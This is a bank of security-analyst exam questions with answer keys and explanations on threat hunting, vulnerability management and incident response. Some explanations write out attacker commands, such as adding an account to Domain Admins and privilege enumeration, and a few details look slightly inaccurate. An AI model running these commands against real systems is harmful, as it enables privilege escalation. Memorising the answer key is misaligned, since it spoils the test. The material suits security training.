{q:"During threat hunting, an analyst searches for processes communicating on ports that don't match their expected behavior. A host is found with 'svchost.exe' communicating on port 4444. This is suspicious because:",o:["svchost.exe should not run", "Legitimate svchost.exe communicates on specific Windows service ports (135, 445, 3389, etc.) — not arbitrary high ports like 4444. Port 4444 is the Metasploit default listener port and is commonly used for reverse shells, strongly suggesting svchost.exe was compromised or is malware masquerading as it", "Port 4444 is blocked", "svchost.exe is not a real process"],a:1,d:1,e:"Process-to-port correlation hunting: each legitimate Windows service (running as svchost) uses specific known ports. svchost hosting WinRM uses 5985, hosting RPC uses 135, hosting SMB shares uses 445. svchost connecting to port 4444 is either: (1) malware masquerading as svchost.exe (check path — must be System32), or (2) legitimate svchost process that was compromised and had shellcode injected (process injection creating an unexpected network connection). Both warrant immediate investigation."},
{q:"An analyst discovers that a threat actor group uses a technique called 'Bring Your Own Vulnerable Driver' (BYOVD). What does this enable?",o:["Faster software updates", "Exploiting a legitimate but vulnerable signed kernel driver to gain kernel-level code execution and disable security software — the driver is signed so it bypasses driver signature enforcement, but its vulnerability allows attackers to execute code in ring 0", "A software licensing bypass", "A network performance improvement"],a:1,d:1,e:"BYOVD (T1068): attackers load a legitimate but vulnerable signed kernel driver (often an old game anti-cheat driver, hardware driver, or security software driver). The driver's valid signature passes Windows Driver Signature Enforcement. The attacker then exploits the driver's vulnerability to execute code at kernel level (ring 0) — above all security software. This enables: disabling EDR sensors, bypassing Protected Process Light, and complete OS control. Detection: block known-vulnerable drivers by hash using Windows Defender Application Control (WDAC) vulnerable driver blocklist."},
{q:"A SOC analyst is analyzing a large dataset of authentication logs. Which analytical technique would BEST identify accounts that authenticate at unusual times compared to their historical pattern?",o:["Manual review of all 10,000 accounts", "Statistical baseline analysis using standard deviation — calculating each account's normal authentication time distribution and alerting when current activity falls more than N standard deviations outside the baseline", "Simple keyword search", "Only reviewing failed authentications"],a:1,d:1,e:"Statistical behavioral analytics: (1) build a baseline distribution of authentication times per account (mean authentication time, standard deviation, weekday vs. weekend patterns), (2) score current authentication against the baseline — Z-score measures how many standard deviations from mean, (3) alert on Z-scores above a threshold. This is the core of UEBA — automated statistical anomaly detection that scales to thousands of accounts without manual review. Start with accounts that are \x3E 3 standard deviations from normal."},
{q:"Which technique uses manipulated DNS responses to redirect users from legitimate websites to attacker-controlled servers?",o:["DDoS attack", "DNS cache poisoning (Kaminsky attack) or BGP hijacking — injecting fraudulent DNS records into resolvers' caches, redirecting users who query that resolver for a domain to the attacker's IP instead of the legitimate server", "ARP spoofing", "SSL stripping"],a:1,d:1,e:"DNS cache poisoning (T1584.002): by injecting fraudulent DNS responses into a recursive resolver's cache, all users of that resolver are redirected. The Kaminsky attack (2008) demonstrated efficient cache poisoning by sending many responses with random transaction IDs. Protections: DNSSEC (cryptographically signed DNS records), DNS over HTTPS (DoH), DNS over TLS (DoT), randomized query port and transaction ID. Detection: monitor for DNS response anomalies, unexpected IP changes for known-good domains."},
{q:"An analyst is reviewing firewall deny logs and notices that an internal host is generating denies for outbound connections to IP addresses in 16 different countries, all on port 443, over a 4-hour period. This pattern is MOST consistent with:",o:["Normal web browsing", "Malware attempting to connect to a pre-programmed list of C2 IP addresses across multiple countries, getting blocked by firewall, continuing through fallback IPs — a C2 backup IP list or DGA-to-IP behavior", "VPN usage", "Software updates"],a:1,d:1,e:"Multi-country C2 fallback: C2 frameworks include backup IP lists or rotate through IPs registered in different countries. When primary C2 is blocked, malware tries the next IP. All-port-443 across many countries in sequence = malware working through a hardcoded list. The firewall is blocking the attempts (good news) but the malware is still running and infected (requires remediation). Collect all blocked destination IPs, cross-reference with threat intel, and use them to hunt across other internal hosts."},
{q:"Which tool is purpose-built for investigating Active Directory environments and identifying attack paths including Kerberoastable accounts, AS-REP roastable accounts, and DCSync rights?",o:["Wireshark", "BloodHound — ingests AD data and graphically maps attack paths, privilege relationships, and specific vulnerability indicators like Kerberoastable SPNs, accounts with no pre-authentication required, and paths to Domain Admin", "Nessus", "Qualys"],a:1,d:1,e:"BloodHound (T1069, T1087 detection tool for defenders): queries AD through SharpHound collector (LDAP queries), builds a graph of every AD relationship, and runs 'pre-built queries' identifying: shortest paths to Domain Admin, Kerberoastable accounts (SPNs), AS-REP roastable accounts (no preauth), DCSync rights (accounts with Replicating Directory Changes), and unconstrained delegation. Defenders use it to find and break these paths before attackers exploit them in purple team exercises."},
{q:"An analyst reviews email headers and finds that the 'From' address shows 'ceo@company.com' but the 'Reply-To' and 'Return-Path' headers show 'attacker@evil.com'. This indicates:",o:["Normal email configuration", "Email spoofing — the display From address appears legitimate but replies and bounces go to the attacker. This is a Business Email Compromise (BEC) technique to impersonate executives while collecting replies", "A mail server misconfiguration", "The email is legitimate"],a:1,d:1,e:"BEC email spoofing: the From display address (what users see in email clients) says ceo@company.com. The technical Reply-To and Return-Path (where replies actually go) point to attacker@evil.com. An employee who hits reply thinks they're emailing the CEO but is actually emailing the attacker. DMARC with reject policy prevents sending spoofed From addresses for protected domains. Email security gateways should flag mismatches between From display address and Reply-To for domains that publish DMARC records."},
{q:"During security monitoring, an analyst observes that a system's memory usage has been consistently at 95%+ for 3 days despite no change in applications. Which security hypothesis should be investigated FIRST?",o:["The server needs more RAM", "Memory-resident malware or cryptominer — legitimate applications with sustained high memory consumption should have obvious causes. Unexplained persistent high memory may indicate process injection, reflective DLL loading, or cryptomining allocating memory for hash calculations", "Ignore — hardware degrades over time", "Schedule a RAM upgrade"],a:1,d:1,e:"Unexplained high memory: (1) check running processes for any consuming unexpected memory amounts, (2) look for processes with no disk-backed executable (memory-only payloads appear with no file path in some tools), (3) check for new processes that don't belong (process masquerading), (4) look for unusually large process memory allocations in legitimate processes (injection). Cryptominers legitimately show as high CPU, but sophisticated miners that use memory-based algorithms show high memory instead."},
{q:"Which capability allows an analyst to determine which specific MITRE ATT&CK techniques an endpoint security tool is capable of detecting?",o:["Vendor marketing materials", "MITRE ATT&CK Evaluations and internal purple team exercises — vendor evaluations test specific detection capabilities against real APT techniques, while internal exercises validate detections against the organization's specific environment", "Compliance certifications", "Uptime statistics"],a:1,d:1,e:"MITRE ATT&CK Evaluations test endpoint security vendors against emulated APT group techniques, publishing detailed detection results per technique. This enables objective comparison of 'does product X detect T1003.001 LSASS memory dumping?' An organization can map their currently deployed tool's evaluation results against their threat model — identifying detection gaps. Internal purple team exercises validate actual configuration effectiveness (a tool may detect T1003 in general, but your specific configuration might miss it)."},
{q:"A threat intelligence feed provides an IOC: MD5 hash = d41d8cd98f00b204e9800998ecf8427e. An analyst should be SKEPTICAL because:",o:["MD5 hashes are always reliable", "d41d8cd98f00b204e9800998ecf8427e is the MD5 hash of an EMPTY file — this is a well-known value that would match no actual malware. This indicates the threat intel feed has data quality issues, likely from automated collection that generated incorrect hashes", "MD5 hashes cannot be trusted for any reason", "The hash format looks wrong"],a:1,d:1,e:"IOC quality validation: d41d8cd98f00b204e9800998ecf8427e is universally known as the empty file hash — a common data quality error in automated threat intel feeds. Other quality issues: IP addresses in RFC 1918 private ranges (can't be internet C2), localhost (127.0.0.1), CDN IPs shared by thousands of legitimate sites, domains that are major CDNs (e.g., cloudflare.com). Blocking these 'indicators' would break legitimate traffic. Threat intel feeds require quality validation before operationalizing."},
{q:"Which security monitoring approach creates a complete audit trail of all administrative actions performed on critical servers?",o:["Standard Windows event logging", "Privileged Access Workstation (PAW) with session recording through a Privileged Access Management (PAM) solution — records all keystrokes, commands, and screen activity for every privileged session on critical infrastructure", "Network monitoring only", "Email monitoring"],a:1,d:1,e:"PAM session recording: all administrative access to critical servers routes through a PAM jump server that records every session. The recording captures: exact commands run, files accessed, configuration changes made, and timestamps. This enables: (1) forensic reconstruction of what happened during any admin session, (2) detection of anomalous admin activity, (3) compliance evidence for auditors (PCI DSS, SOX require admin access monitoring), (4) insider threat detection. Sessions can be reviewed in real-time or post-incident."},
{q:"An analyst is triaging an alert about a host communicating with a known Tor exit node. The host is a domain controller. The severity assessment should be:",o:["Low — Tor is used for privacy", "Critical — domain controllers should have tightly controlled outbound communication to a small set of known services. DC communication with Tor strongly indicates compromise — attackers may be routing C2 through Tor to anonymize their infrastructure, and a compromised DC means complete domain compromise", "Medium — investigate next week", "Ignore if the traffic volume is low"],a:1,d:1,e:"Domain controller (DC) outbound communication anomaly: DCs have a well-defined set of legitimate communication needs (replication, DNS, time sync, LDAP). Tor exit node communication has no legitimate DC use case. A compromised DC means: every account in the domain is potentially compromised (NTDS.dit access), GPO manipulation enables persistence on all domain-joined systems, and the attacker has complete domain control. This is a most-critical incident requiring immediate isolation and full IR engagement."},
{q:"Which forensic artifact stores information about recently accessed documents and frequently accessed folders in Windows, useful for establishing what data a user accessed before an incident?",o:["Windows Registry Run keys", "LNK files (shortcuts in %APPDATA%\\Microsoft\\Windows\\Recent\\) and Jump Lists (%APPDATA%\\Microsoft\\Windows\\Recent\\AutomaticDestinations) — these record recently opened files and frequently accessed items, even after the original files are deleted", "Prefetch files", "Event ID 4624"],a:1,d:1,e:"LNK files and Jump Lists: Windows automatically creates shortcut (LNK) files for recently accessed documents. LNK files record: original file path, file size, timestamps, volume serial number, and MAC address where the file was last accessed. Even after the original file is deleted, the LNK file persists, proving the file existed and was accessed. Jump Lists extend this to frequently accessed items per application. Critical for: proving what data a user accessed before deletion, establishing insider threat timelines."},
{q:"A security analyst discovers that the organization's DNS server is resolving the domain 'legit-bank.com' to an internal IP address (192.168.1.50) rather than the bank's actual IP. This indicates:",o:["A DNS caching issue", "DNS zone tampering or split-horizon DNS abuse — an internal DNS record has been created to redirect legitimate traffic to an attacker-controlled server, enabling credential harvesting or man-in-the-middle attacks against employees trying to access the real bank", "A network configuration error", "Normal DNS behavior"],a:1,d:1,e:"Internal DNS poisoning: adding internal A records for external domains redirects employees to attacker-controlled servers. Employees trying to reach legit-bank.com are silently redirected to an internal attacker server serving a fake login page. Their credentials are harvested. Detection: monitor DNS server configuration changes (Event ID 770 DNS Audit log), compare internal DNS records against external resolution for key domains, and alert on internal records for domains the organization doesn't own."},
{q:"Which technique does an attacker use after gaining initial access to enumerate the specific privileges of the compromised account?",o:["Immediately attempt domain escalation", "T1033 System Owner/User Discovery and T1069 Permission Groups Discovery — running 'whoami /all', 'net user username /domain', 'id' (Linux), or PowerShell 'Get-ADUser' to understand the current privilege level before determining next steps", "Begin data exfiltration immediately", "Deploy ransomware immediately"],a:1,d:1,e:"Post-compromise privilege enumeration is one of the first steps attackers take: 'whoami /priv' shows Windows privileges, 'whoami /groups' shows group memberships, 'net localgroup Administrators' shows local admins, 'net group \"Domain Admins\" /domain' shows DA membership. Detection: these are common commands but unusual coming from non-admin users, at unusual times, or with unusual parent processes. SIEM rules alerting on AD enumeration commands from non-admin endpoints catch this reconnaissance."},
{q:"An analyst examining malware behavior in a sandbox notices the malware checks if it's running in a virtual environment by querying CPUID for hypervisor flags. If a VM is detected, it exits without running the payload. This technique is called:",o:["Normal system check", "Anti-analysis/VM detection — malware detecting sandbox/VM environments to avoid analysis. Modern sandboxes counter this with bare-metal analysis, CPUID spoofing, or long-dwell execution triggering", "Performance optimization", "Legitimate system query"],a:1,d:1,e:"VM/sandbox detection techniques: (1) CPUID hypervisor bit check, (2) checking for VM-specific registry keys (VMware Tools, VirtualBox Guest Additions), (3) checking for VM-specific files and processes, (4) timing attacks (VM operations take slightly longer), (5) checking for too-perfect environments (new install, no recent files, specific usernames like 'analysis'). Advanced countermeasures: use bare-metal analysis systems, configure sandbox to appear as real user environments (real files, browser history, etc.)."},
{q:"Which Windows built-in capability allows an analyst to take a snapshot of all running processes, their loaded DLLs, open handles, and network connections at a specific point in time?",o:["Task Manager", "ProcDump (Sysinternals) or Process Monitor — ProcDump creates full memory dumps of processes, Process Monitor captures real-time file system/registry/network/process activity. For a complete snapshot: 'procdump -ma PID' captures the full memory state of a specific process", "Windows Defender", "Event Viewer"],a:1,d:1,e:"Live system analysis tools: Process Monitor (procmon) captures all process activity in real-time — file, registry, network, process events with call stacks. ProcDump creates full memory dumps for specific processes (useful for capturing malware state: procdump -ma PID \x3E malware.dmp). Sysinternals tools run from read-only media without installation and don't significantly alter the forensic state. For a complete system state: Sysinternals Autoruns + Process Monitor + TCPView + handle.exe provides comprehensive visibility."},
{q:"During SIEM analysis, an analyst is reviewing alerts and finds one that fired 10,000 times in the past hour for the same source IP. The analyst should:",o:["Investigate all 10,000 individually", "Sample 10-15 representative events to understand the pattern, then determine if this represents a true positive (attack), false positive (misconfigured rule), or rule gap (the rule fires on legitimate traffic that should be excluded). Update the rule to reduce noise while preserving true positive detection", "Ignore — high volume alerts are always false positives", "Escalate all 10,000 as separate incidents"],a:1,d:1,e:"High-volume alert triage: sampling representative events reveals the pattern. If all 10,000 are from the same monitoring tool scanning a known-good system (false positive) — add an exclusion. If they represent real attacks — investigate the source, understand the pattern, and consider automated blocking. If they represent legitimate traffic triggering incorrectly — tune the rule threshold or add context. The goal: reduce volume to the actionable minimum while ensuring real positives are still detected."},
{q:"An attacker establishes persistence on a Windows system by creating a COM object hijacking entry. Which registry path is being targeted?",o:["HKLM\\SYSTEM\\CurrentControlSet\\Services", "HKCU\\Software\\Classes\\CLSID\\ — adding a COM class entry in the user's registry hive for a CLSID that Windows searches user-space first. When applications load that COM object, the malicious implementation is loaded instead", "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Run", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"],a:1,d:1,e:"COM hijacking (T1546.015): Windows searches HKCU before HKLM for COM object implementations. If an attacker adds a CLSID entry in HKCU\\Software\\Classes\\CLSID\\ that matches a commonly loaded COM object (e.g., used by Task Scheduler or MMC), their DLL is loaded instead. No admin required (HKCU is user-writable). Difficult to detect because COM loading is normal behavior. Detection: monitor for new HKCU CLSID entries with LocalServer32 or InprocServer32 pointing to unusual paths."},
{q:"Which CVSS v3.1 vector string represents the MOST severe vulnerability?",o:["CVSS:3.1/AV:N/AC:H/PR:H/UI:R/S:U/C:L/I:N/A:N", "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H — Network vector, Low complexity, No privileges required, No user interaction, Scope Changed, High CIA impact. This is the maximum severity combination (10.0)", "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:U/C:L/I:L/A:L", "CVSS:3.1/AV:P/AC:H/PR:H/UI:R/S:U/C:N/I:N/A:N"],a:1,d:2,e:"Maximum CVSS v3.1: AV:N (Network — remotely exploitable), AC:L (Low complexity — no special conditions), PR:N (None — no privileges needed), UI:N (None — no user interaction), S:C (Scope Changed — impacts other components), C:H/I:H/A:H (High impact on all three). This describes a remotely exploitable, zero-click vulnerability that can cascade to affect other systems. Log4Shell (CVE-2021-44228) scored CVSS 10.0 with this vector."},
{q:"An organization discovers a zero-day vulnerability in their custom-developed web application. No vendor patch exists. The MOST effective immediate mitigation is:",o:["Accept the risk and wait", "Implement temporary mitigations specific to the vulnerability while developers create a permanent code fix: WAF rule blocking the specific exploit pattern, network restrictions limiting access to trusted sources, and enhanced monitoring for exploitation attempts", "Shut down the application entirely", "Only notify users"],a:1,d:2,e:"Zero-day in custom software response: (1) immediate WAF rule targeting the specific vulnerability (if web-based), (2) network access restriction to reduce the attacker pool (limit to known user IP ranges), (3) enhanced logging and monitoring to detect exploitation attempts, (4) emergency sprint by development team to fix the root cause, (5) security review before deploying the fix. Unlike vendor software (wait for patch), custom software gives the organization direct control over when the fix is deployed."},
{q:"A vulnerability scan of a web application finds 'SQL Injection in login form' with a CVSS score of 9.8. A developer states they've already fixed it. What is the NEXT step?",o:["Trust the developer and close the ticket", "Rescan or manually test the specific vulnerability to verify remediation — remediation verification is a required step. Developers may have fixed one injection point while missing others, or the fix may be insufficient (e.g., blacklist instead of parameterized queries)", "Wait 30 days and rescan", "Close with no verification since the developer confirmed the fix"],a:1,d:2,e:"Remediation verification: always rescan after claimed fixes before closing findings. Common partial fix failures: (1) fixed the login form but not password reset (same vulnerability, different location), (2) used blacklisting (can be bypassed) instead of parameterized queries, (3) fixed the GET parameter but not POST body. For a CVSS 9.8 SQLi, manual testing by the security team is appropriate — automated scans may not catch all injection points. Close only after technical verification."},
{q:"An analyst discovers that 60% of the organization's critical vulnerabilities are on assets managed by a single business unit that consistently misses patching SLAs. The BEST approach to improve this is:",o:["Escalate to the CISO and blame the business unit", "Conduct a root cause analysis of why that unit misses SLAs (resource constraints? change management friction? unclear ownership?) and develop targeted solutions — perhaps dedicated patching resources, a simplified process, or executive sponsorship for their remediation work", "Remove the business unit's systems from scope", "Accept the risk indefinitely"],a:1,d:2,e:"Systemic SLA failures require systemic solutions. Root cause analysis reveals: are they missing SLAs because of complex change management (simplify the process for them), insufficient resources (assign dedicated patching staff), unclear ownership (clarify who is responsible for what system), or lack of awareness (improve communication of vulnerability severity)? Punitive escalation without solving the root cause generates resentment without improving patching. Collaborative problem-solving produces sustainable improvement."},
{q:"Which vulnerability classification describes a flaw that allows an attacker to read or write memory outside the intended buffer boundaries?",o:["SQL Injection", "Buffer overflow — writing beyond allocated memory boundaries can corrupt adjacent memory, crash the application, or enable arbitrary code execution by overwriting function return addresses or function pointers", "Path traversal", "Insecure deserialization"],a:1,d:2,e:"Buffer overflows: when an application writes more data to a buffer than it was allocated for, adjacent memory is overwritten. Stack overflows overwrite return addresses — pointing to attacker shellcode. Heap overflows corrupt heap metadata or adjacent objects. Mitigations: ASLR (randomizes memory addresses), DEP/NX (marks memory non-executable), stack canaries (detects overwrites before return), safe coding functions (strncpy vs strcpy). Modern languages (Python, Java, Go) with bounds checking are not vulnerable to classic buffer overflows."},
{q:"An organization's external attack surface management (EASM) scan discovers a subdomain 'dev.company.com' pointing to an AWS S3 bucket that no longer exists. This is a:",o:["Normal DNS configuration", "Subdomain takeover vulnerability — the DNS record points to a cloud resource that was deleted but the DNS record was not removed. An attacker can register that same S3 bucket name and serve malicious content that appears to come from dev.company.com", "Low severity misconfiguration", "Not a security issue"],a:1,d:2,e:"Subdomain takeover (T1584): when a subdomain's DNS record points to a deprovisioned cloud resource (S3 bucket, Azure blob, GitHub Pages, Heroku app), an attacker can claim that resource. Once claimed, anything served from that resource appears to originate from company.com — enabling: cookie theft for .company.com cookies (if accessible from the subdomain), phishing pages hosted on a legitimate company domain, CSP bypasses, and CORS bypass. Remediation: remove DNS records when deprovisioning cloud resources."},
{q:"Which statement about CVSS base scores and environmental scores is CORRECT?",o:["Base scores are always more accurate", "Environmental scores allow organizations to customize base scores based on their specific context (asset criticality, existing controls, compensating mitigations), producing a more accurate risk representation for their environment. The base score is the same for everyone; environmental scores reflect organizational reality", "Environmental scores are always lower", "Environmental scores are optional and provide no value"],a:1,d:2,e:"CVSS base score: same for every organization (reflects technical characteristics of the vulnerability). Environmental score: organization-specific adjustments. Modifiers: (1) Modified Base Metrics — does the attack actually apply to your implementation? (2) Confidentiality/Integrity/Availability Requirements — is this asset critical to your business? High-criticality assets increase the score; assets with compensating controls decrease it. Environmental scores require effort to maintain but provide the most accurate risk prioritization."},
{q:"An organization performs quarterly ASV (Approved Scanning Vendor) external scans as required by PCI DSS. A scan fails because of a medium-severity vulnerability. What is the correct response?",o:["Ignore the medium severity and pass anyway", "Remediate the finding and request a rescan — PCI DSS requires a passing scan with ALL vulnerabilities at certain severity thresholds remediated. A failed scan means the quarterly attestation cannot be signed until a clean rescan is achieved", "Accept the risk and submit the failed scan", "Only critical vulnerabilities require remediation"],a:1,d:2,e:"PCI DSS ASV scan requirements: external scans must pass (no CVSS 4.0+ vulnerabilities per PCI DSS ASV guidelines, though specific thresholds vary by version). A failing scan means: (1) remediate the finding, (2) request an ASV rescan, (3) submit the passing scan report with the Attestation of Scan Compliance. The 90-day quarterly window starts from the passing scan. Organizations close to their quarterly deadline must emergency-patch failing findings to meet the deadline."},
{q:"Which approach ensures that vulnerability intelligence from security research is systematically translated into scanner plugin updates?",o:["Manually read research papers", "Subscribing to vendor CVE plugin feed updates that incorporate NVD, CERT, and vendor advisory data — ensuring scanners can detect new vulnerabilities as they're published, reducing the gap between CVE publication and scanner detection", "Only update scanners annually", "Waiting for exploit code to be published"],a:1,d:2,e:"Scanner plugin currency: most commercial vulnerability scanners (Nessus, Qualys, Rapid7 Nexpose) maintain plugin databases updated from NVD, vendor advisories, and proprietary research. Automatic daily plugin updates ensure new CVEs are detectable as soon as the scanner vendor publishes detection logic. Organizations should verify their scanner is configured for automatic plugin updates and alert if updates fail. A scanner with out-of-date plugins misses recently-published vulnerabilities entirely."},
{q:"A security team discovers that 80% of their critical vulnerabilities are in third-party commercial software they cannot patch without vendor support. The BEST long-term strategy is:",o:["Accept all unpatched vulnerabilities", "Implement a formal third-party software risk management program: tracking vendor patch frequency, contractual SLAs for security patches, vendor security assessments, and compensating controls for delays. Replace vendors with unacceptable patch responsiveness", "Only use open-source software", "Hire more patching staff"],a:1,d:2,e:"Third-party patch dependency management: (1) contract terms: negotiate SLAs for security patch delivery (critical = 7 days, high = 30 days), (2) vendor assessment: include patch history in vendor security evaluations (vendors who don't patch promptly are security risks), (3) vulnerability notification: ensure vendors notify you of vulnerabilities affecting your deployment before public disclosure, (4) compensating controls: network isolation, WAF rules, enhanced monitoring while waiting for vendor patches, (5) replacement evaluation: chronic patch failures = product risk requiring replacement consideration."},
{q:"Which term describes the total scope of potential vulnerabilities across all software components, hardware, interfaces, and people within an organization?",o:["Threat landscape", "Attack surface — the complete set of potential entry points that an attacker could use, encompassing all software versions, network services, user accounts, physical access points, and third-party connections. Attack surface management aims to continuously discover, assess, and minimize this surface", "Risk posture", "Threat model"],a:1,d:2,e:"Attack surface includes: (1) network-facing services (web apps, APIs, email, VPN), (2) software dependencies (OS, libraries, frameworks), (3) user accounts and credentials, (4) third-party connections (suppliers, SaaS integrations), (5) physical access points, (6) people (social engineering surface). Attack surface reduction: disable unnecessary services, remove unused accounts, reduce integration surface, minimize privileged access. Every attack surface reduction directly reduces the number of potential vulnerabilities that need managing."},
{q:"A vulnerability analyst receives a CVE alert for a critical vulnerability in OpenSSL. To understand the actual impact, the FIRST step is:",o:["Immediately patch all systems", "Determine which systems in the organization use OpenSSL, what version they run, and whether they fall within the vulnerable version range — scope assessment before remediation", "Check CVSS score only", "Ignore — OpenSSL is rarely used"],a:1,d:2,e:"Scoping is the foundation of vulnerability response. A CVE affecting OpenSSL 3.0.0-3.0.6 requires: (1) identify all systems running OpenSSL (CMDB, software inventory, SCA tool results), (2) identify the specific version on each system, (3) determine which fall in the affected version range, (4) prioritize: internet-facing systems first. Without scoping, you don't know what to patch. With scoping, you have a targeted, prioritized remediation list. Many high-profile vulnerabilities affect specific versions only — scope assessment prevents wasted effort on unaffected systems."},
{q:"A company employee forwards a suspicious email to the security team saying 'I almost clicked this.' The security analyst's FIRST action is:",o:["Tell the employee they did the right thing and close the ticket", "Check if any other employees received the same campaign: query email gateway logs for the sender, subject, and malicious URL/hash across all mailboxes — one report often means many received the same phishing email", "Only analyze the one email", "Block the sender only"],a:1,d:3,e:"Single phishing report = likely campaign. One employee reporting means: (1) others likely received the same email and some may have clicked, (2) the threat is active right now. Immediate action: query email gateway for all recipients of the same campaign (same sender, subject, attachment hash, or URL), quarantine all copies still in mailboxes, check EDR for any hosts that visited the malicious URL, identify any employees who clicked and may need credential rotation."},
{q:"During incident response to an advanced threat, an IR team member suggests 'pulling the plug' (immediate power-off) on a suspected compromised server. The team lead disagrees. The team lead's MOST valid objection is:",o:["Power-off is always the safest option", "Immediate power-off destroys volatile evidence (RAM contents: running processes, network connections, encryption keys, injected code) that may be critical for understanding the attack and finding other compromised systems. Network isolation provides the same access cut-off while preserving forensic evidence", "The server is too important to take down", "Power-off may alert the attacker"],a:1,d:3,e:"Network isolation vs. power-off debate: network isolation (unplug network cable, isolate at switch) stops attacker access AND preserves volatile memory for forensic collection. Power-off destroys: running malware code in memory, C2 channels, injected shellcode, decrypted data, and encryption keys. The exception: ransomware actively encrypting — power-off immediately to halt encryption. For all other scenarios: network isolation first, then RAM capture, then power-off if needed."},
{q:"Which NIST SP 800-61 activity occurs during the 'Containment, Eradication, and Recovery' phase but is often incorrectly placed in 'Detection and Analysis'?",o:["Writing the IR report", "Forensic evidence collection — evidence should be collected during containment (before eradication destroys evidence) while the system is still in its compromised state, preserved with hashes, then eradication proceeds", "Setting up monitoring", "Training the IR team"],a:1,d:3,e:"Evidence collection timing: collecting forensic evidence must happen AFTER detection (you know there's an incident) but BEFORE eradication (cleanup destroys evidence). This places evidence collection squarely in the Containment phase — contain the system (stop the spread), collect evidence (disk image, RAM dump), then eradicate (clean the system). Organizations that jump straight to eradication lose the forensic record needed for: root cause analysis, legal proceedings, threat hunting, and building better detections."},
{q:"An analyst discovers that an attacker pivoted from a compromised workstation to an internal server using stolen credentials, then ran 'net group Domain Admins /add compromised_user /domain'. The SPECIFIC term for this type of attack is:",o:["Privilege escalation", "Lateral movement combined with domain privilege escalation — the attacker moved laterally (workstation to server) and then escalated domain privileges by adding their compromised account to Domain Admins, achieving full domain control", "Initial access", "Defense evasion"],a:1,d:3,e:"Attack progression terminology: (1) Initial Access: compromise of the first workstation, (2) Lateral Movement: workstation → server using stolen credentials, (3) Privilege Escalation: adding account to Domain Admins, (4) Domain Compromise: full AD control achieved. Each step is distinct in MITRE ATT&CK: T1570 (lateral tool transfer), T1021 (remote services for lateral movement), T1098.007 (account manipulation — adding to DA). Understanding the distinct phases enables precise detection rule creation targeting each step."},
{q:"Which containment action specifically addresses the risk of an attacker using previously stolen credentials to maintain access after an incident?",o:["Rebuilding systems", "Credential rotation — changing all potentially compromised credentials including service accounts, admin accounts, and resetting the Kerberos KRBTGT password to invalidate any existing tickets. System rebuilds alone leave credentials valid", "Enhanced monitoring", "Blocking known C2 IPs"],a:1,d:3,e:"Credential invalidation after a compromise: (1) reset all domain user passwords in affected scope, (2) rotate all service account passwords (or replace with MSAs), (3) reset KRBTGT password twice (once is insufficient to invalidate all Golden Tickets), (4) revoke and reissue SSL certificates on compromised servers, (5) rotate API keys, cloud credentials, and application secrets accessible from compromised systems. Without credential rotation, attackers re-enter cleaned environments using previously stolen valid credentials — rebuilding systems without rotating credentials is incomplete remediation."},
{q:"A digital forensics analyst is examining a disk image and wants to recover deleted files. The MOST important prerequisite is:",o:["Having the original device", "Working from a forensic image with a verified hash matching the original — analysis always on the image copy, never the original evidence, with hash verification confirming no modification occurred during acquisition", "Running the analysis on the original disk", "Having special recovery software"],a:1,d:3,e:"Forensic analysis on copies: never analyze original evidence directly — analysis tools can modify metadata, create new files, and alter the evidence state. Create a forensic image (bitwise copy), verify hash (SHA256) against the original before analysis, then analyze the verified copy. If analysis inadvertently modifies the image, make a new copy from the verified original. This preserves: (1) legal admissibility (original unaltered), (2) ability to restart analysis from scratch, (3) multiple analysts can work from separate copies simultaneously."},
{q:"Which type of incident response exercise involves security team members sitting around a table and verbally walking through response procedures for a hypothetical scenario?",o:["Red team exercise", "Tabletop exercise — a discussion-based exercise where participants verbally walk through their response to a scenario, identifying gaps in plans, communication, and decision-making without deploying actual tools or systems", "Full-scale simulation", "Purple team exercise"],a:1,d:3,e:"Tabletop exercise characteristics: (1) no systems are actually touched, (2) participants talk through their actions (what would you do next?), (3) scenario is presented by a facilitator, (4) focuses on process, decision-making, and communication gaps, (5) outputs an action list of plan updates. More operationally intensive exercises: functional exercise (some systems/tools activated), full-scale simulation (deploy actual IR tools, simulate actual attack). Tabletops are the most cost-effective way to test plans regularly — monthly or quarterly."},
{q:"An IR analyst discovers that the attacker maintained access to the network for 8 months by rotating through 15 different C2 domains, none of which were in any threat intel blocklist. This technique is known as:",o:["Domain fronting", "Infrastructure rotation or multi-stage C2 — using multiple C2 servers and domains, replacing them frequently before defenders can identify and block them. Paired with fresh domain registration, this creates a moving target that outlasts blocklist-based defenses", "DGA malware", "Domain squatting"],a:1,d:3,e:"Infrastructure rotation is a key APT evasion technique. Countermeasures: (1) behavioral detection (same malware TTP regardless of C2 domain), (2) JA3 fingerprinting (same TLS implementation regardless of domain), (3) certificate monitoring (same certificate chain patterns across rotated domains), (4) netflow analysis (same communication patterns to different destinations), (5) threat hunting for the implant characteristics rather than the C2 infrastructure. Infrastructure blocks are a speed bump; behavioral detection is sustainable."},
{q:"A security team is performing eradication after discovering 47 compromised systems. They clean 46 and accidentally miss 1. What is the LIKELY outcome?",o:["The incident is 97.9% resolved", "The 1 missed system allows the attacker to recompromise all 46 cleaned systems — attackers with one active foothold can re-establish all the access that was removed. Complete eradication requires 100% scope coverage, not 97.9%", "Minimal impact from one missed system", "Only that 1 system remains compromised"],a:1,d:3,e:"Incomplete eradication = failed remediation. One active foothold gives the attacker: (1) network access to reach all 46 cleaned systems, (2) valid (rotated) credentials obtained from the compromised system before cleanup began, (3) ability to re-deploy malware from the still-infected system. Within days, the attacker re-establishes presence across all previously cleaned systems. This is why scoping before eradication is critical — you must find ALL compromised systems before beginning cleanup."},
{q:"Which factor distinguishes a 'data breach' requiring notification from a simple 'security incident' under most regulatory frameworks?",o:["The size of the data stolen", "Unauthorized access, acquisition, or disclosure of personal information (PII/PHI) — most breach notification laws are triggered by unauthorized access to personal data, not just any security event. A ransomware attack encrypting internal business documents may not require notification; one accessing customer PII does", "The sophistication of the attack", "The duration of the incident"],a:1,d:3,e:"Breach notification trigger: unauthorized access/acquisition of personal data. Regulatory definitions vary: GDPR (personal data of EU subjects), HIPAA (PHI — protected health information), state laws (varies by PII type — SSN, financial account, medical, login credentials). A network intrusion that never touched personal data may not require breach notification. An intrusion that accessed a database with 1,000 customer records likely does. The legal analysis determining notification obligation is driven by: what data was accessed, is it PII/PHI, and what jurisdiction applies."},
